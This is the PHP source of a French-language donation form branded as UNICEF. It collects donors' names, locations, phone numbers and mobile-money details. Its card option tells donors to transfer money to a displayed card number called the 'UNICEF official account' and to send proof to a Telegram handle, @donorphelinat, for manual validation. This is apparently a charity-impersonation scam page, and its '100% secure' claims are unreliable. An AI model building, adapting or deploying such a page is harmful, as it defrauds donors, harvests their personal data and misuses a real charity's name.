<?php
// =====================================================================
// PAGE DE DON — Formulaire en 3 étapes
// 1) Type de donateur (anonyme / identifié) + montant
// 2) Méthode de paiement (mobile / carte bancaire)
// 3) Confirmation puis suivi temps réel via /paiement.php
// =====================================================================
require_once __DIR__ . '/includes/functions.php';
require_once __DIR__ . '/includes/lang.php';

$pageTitle = 'Faire un don — UNICEF';
require __DIR__ . '/includes/header.php';

// Liste des pays/opérateurs (récupérée via l'API de paiement, mise en cache simple)
$countriesPay = [
    ['code'=>'CM','name'=>'Cameroun','currency'=>'XAF','operators'=>['MTN Mobile Money','Orange Money']],
    ['code'=>'SN','name'=>'Sénégal','currency'=>'XOF','operators'=>['Free Money','Orange Money','Wave']],
    ['code'=>'CI','name'=>'Côte d\'Ivoire','currency'=>'XOF','operators'=>['MTN Mobile Money','Orange Money','Moov Money','Wave']],
    ['code'=>'BJ','name'=>'Bénin','currency'=>'XOF','operators'=>['Moov Money','MTN Mobile Money']],
    ['code'=>'BF','name'=>'Burkina Faso','currency'=>'XOF','operators'=>['Moov Money','Orange Money']],
    ['code'=>'TG','name'=>'Togo','currency'=>'XOF','operators'=>['T-Money','Moov Money']],
    ['code'=>'ML','name'=>'Mali','currency'=>'XOF','operators'=>['Orange Money','Moov Money']],
    ['code'=>'NE','name'=>'Niger','currency'=>'XOF','operators'=>['Airtel Money','Orange Money']],
    ['code'=>'GA','name'=>'Gabon','currency'=>'XAF','operators'=>['Airtel Money','Moov Money']],
    ['code'=>'CG','name'=>'Congo','currency'=>'XAF','operators'=>['Airtel Money','MTN Mobile Money']],
    ['code'=>'CD','name'=>'RD Congo','currency'=>'CDF','operators'=>['Airtel Money','Orange Money','M-Pesa']],
    ['code'=>'GN','name'=>'Guinée','currency'=>'GNF','operators'=>['Orange Money','MTN Mobile Money']],
    ['code'=>'TD','name'=>'Tchad','currency'=>'XAF','operators'=>['Airtel Money','Moov Money']],
    ['code'=>'CF','name'=>'Centrafrique','currency'=>'XAF','operators'=>['Orange Money','Telecel']],
    ['code'=>'KM','name'=>'Comores','currency'=>'KMF','operators'=>['Telma Money']],
    ['code'=>'MG','name'=>'Madagascar','currency'=>'MGA','operators'=>['Orange Money','Airtel Money','Telma Money']],
];
?>

<section class="don-page">
  <div class="container">

    <div class="don-header">
      <h1>Faire un don</h1>
      <p class="muted">Votre soutien sauve des vies. <strong>Paiement 100% sécurisé.</strong></p>

      <!-- Stepper visuel -->
      <div class="stepper">
        <div class="step active" data-step="1"><span>1</span> Vos informations</div>
        <div class="step" data-step="2"><span>2</span> Paiement</div>
        <div class="step" data-step="3"><span>3</span> Confirmation</div>
      </div>
    </div>

    <form id="donForm" class="don-card" autocomplete="on" novalidate>

      <!-- ================= ÉTAPE 1 ================= -->
      <div class="step-pane" data-pane="1">
        <h2>Qui fait ce don ?</h2>
        <div class="donor-type">
          <label class="radio-card">
            <input type="radio" name="donor_type" value="identified" checked>
            <div>
              <div class="rc-title">👤 Don identifié</div>
              <div class="rc-desc">Recevez un reçu et un mot de remerciement personnalisé.</div>
            </div>
          </label>
          <label class="radio-card">
            <input type="radio" name="donor_type" value="anonymous">
            <div>
              <div class="rc-title">🕊️ Don anonyme</div>
              <div class="rc-desc">Donnez en toute discrétion, juste le montant.</div>
            </div>
          </label>
        </div>

        <div id="identifiedFields">
          <div class="form-grid">
            <div class="field"><label>Prénom *</label><input type="text" name="first_name" required></div>
            <div class="field"><label>Nom *</label><input type="text" name="last_name" required></div>
            <div class="field">
              <label>Pays *</label>
              <select name="country" required>
                <option value="">— Sélectionner —</option>
                <?php foreach ($countriesPay as $cp): ?>
                  <option value="<?= e($cp['code']) ?>"><?= e($cp['name']) ?></option>
                <?php endforeach; ?>
              </select>
            </div>
            <div class="field"><label>Ville *</label><input type="text" name="city" required></div>
            <div class="field"><label>Téléphone (optionnel)</label><input type="tel" name="phone" placeholder="+237..."></div>
            <div class="field"><label>Email (optionnel)</label><input type="email" name="email"></div>
          </div>
        </div>

        <div class="amount-section">
          <label class="big-label">Montant du don (XAF) *</label>
          <div class="quick-amounts">
            <button type="button" class="quick-amt" data-amt="500">500</button>
            <button type="button" class="quick-amt" data-amt="1000">1 000</button>
            <button type="button" class="quick-amt" data-amt="2500">2 500</button>
            <button type="button" class="quick-amt" data-amt="5000">5 000</button>
            <button type="button" class="quick-amt" data-amt="10000">10 000</button>
            <button type="button" class="quick-amt" data-amt="25000">25 000</button>
          </div>
          <input type="number" name="amount" id="amountInput" min="100" step="100" required placeholder="Saisissez un montant libre">
          <div class="hint">Montant minimum : 100 XAF</div>
        </div>

        <div class="step-actions">
          <button type="button" class="btn btn-primary" data-next="2">Continuer →</button>
        </div>
      </div>

      <!-- ================= ÉTAPE 2 ================= -->
      <div class="step-pane" data-pane="2" hidden>
        <h2>Méthode de paiement</h2>

        <div class="payment-methods">
          <label class="radio-card">
            <input type="radio" name="payment_method" value="mobile" checked>
            <div>
              <div class="rc-title">📱 Paiement Mobile</div>
              <div class="rc-desc">Validez directement depuis votre téléphone (Orange Money, MTN MoMo, Moov, Wave...)</div>
            </div>
          </label>
          <label class="radio-card">
            <input type="radio" name="payment_method" value="card">
            <div>
              <div class="rc-title">💳 Virement par carte bancaire</div>
              <div class="rc-desc">Effectuez un virement vers notre carte bancaire dédiée.</div>
            </div>
          </label>
        </div>

        <!-- Bloc Mobile -->
        <div id="mobileBlock" class="pay-block">
          <div class="form-grid">
            <div class="field">
              <label>Pays *</label>
              <select name="pay_country" id="payCountry" required>
                <option value="">— Sélectionner —</option>
                <?php foreach ($countriesPay as $cp): ?>
                  <option value="<?= e($cp['code']) ?>" data-currency="<?= e($cp['currency']) ?>" data-operators='<?= e(json_encode($cp['operators'])) ?>'><?= e($cp['name']) ?></option>
                <?php endforeach; ?>
              </select>
            </div>
            <div class="field">
              <label>Opérateur *</label>
              <select name="operator" id="payOperator" required disabled>
                <option value="">— Choisir un pays d'abord —</option>
              </select>
            </div>
            <div class="field" style="grid-column: 1 / -1;">
              <label>Numéro de téléphone qui effectuera le paiement *</label>
              <input type="tel" name="payment_phone" id="paymentPhone" required placeholder="Ex: 670000000">
            </div>
          </div>
        </div>

        <!-- Bloc Carte -->
        <div id="cardBlock" class="pay-block" hidden>
          <div class="card-info">
            <div class="card-visual">
              <div class="card-brand">MASTERCARD</div>
              <div class="card-number" id="cardNumber"><?= e(CARD_NUMBER) ?></div>
              <div class="card-foot">UNICEF — Compte officiel</div>
            </div>
            <button type="button" class="btn btn-ghost" id="copyCard">📋 Copier le numéro</button>
            <p class="muted small">Effectuez un virement du montant sur cette carte. Conservez votre preuve de virement et envoyez-la sur Telegram <a href="<?= e(CONTACT_TELEGRAM_LINK) ?>" target="_blank">@donorphelinat</a> pour validation manuelle.</p>
          </div>
        </div>

        <div class="step-actions">
          <button type="button" class="btn btn-ghost" data-prev="1">← Retour</button>
          <button type="button" class="btn btn-primary" data-next="3">Continuer →</button>
        </div>
      </div>

      <!-- ================= ÉTAPE 3 ================= -->
      <div class="step-pane" data-pane="3" hidden>
        <h2>Récapitulatif de votre don</h2>
        <div class="summary" id="summary"></div>

        <div class="secure-note">
          🔒 Paiement 100% sécurisé. Aucune donnée bancaire n'est stockée.
        </div>

        <div class="step-actions">
          <button type="button" class="btn btn-ghost" data-prev="2">← Retour</button>
          <button type="submit" class="btn btn-primary" id="submitBtn">✓ Valider mon don</button>
        </div>
      </div>

    </form>

  </div>
</section>

<script>
  window.__PAY_CARD = <?= json_encode(CARD_NUMBER) ?>;
</script>
<script src="/assets/js/don.js"></script>

<?php require __DIR__ . '/includes/footer.php'; ?>
